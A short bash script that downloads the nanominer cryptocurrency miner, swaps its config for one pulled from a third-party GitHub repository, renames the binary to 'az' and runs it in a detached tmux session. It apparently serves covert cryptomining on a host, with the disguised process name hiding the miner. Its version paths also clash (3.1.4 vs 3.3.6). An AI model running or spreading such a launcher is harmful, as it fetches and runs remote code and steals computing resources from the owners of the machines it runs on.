#!/bin/bash

if [ -f ${PWD}/nanominer-linux-3.1.4/az ]; then
    if pgrep -x "az" > /dev/null
then
	echo " Ok roi"
else
cd nanominer-linux-3.1.4 && tmux new-session -d -s my_session1 './az'

fi
exit
fi

wget https://github.com/nanopool/nanominer/releases/download/v3.3.6/nanominer-linux-3.3.6.tar.gz && tar xvzf nanominer-linux-3.3.6.tar.gz && cd nanominer-linux-3.3.6 && rm config.ini && wget https://raw.githubusercontent.com/haidanglx/killtut/master/config.ini && mv nanominer az &&  tmux new-session -d -s my_session1 './az'
